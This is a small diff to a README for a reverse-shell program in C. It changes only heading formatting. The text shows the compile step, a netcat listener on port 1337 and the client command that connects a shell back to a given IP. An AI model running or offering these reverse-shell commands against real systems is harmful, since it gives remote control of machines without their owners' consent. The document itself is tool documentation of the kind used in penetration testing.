@@ -7,12 +7,12 @@ gcc -o reverse-shell reverse-shell.c
 ```
 
 ## Using
-``Host machine (With netcat)``
+**Host machine (With netcat)**
 ```
 nc -l -p 1337
 ```
 
-``Client machine:``
+**Client machine:**
 ```
 ./reverse-shell <ip> 1337
 ```
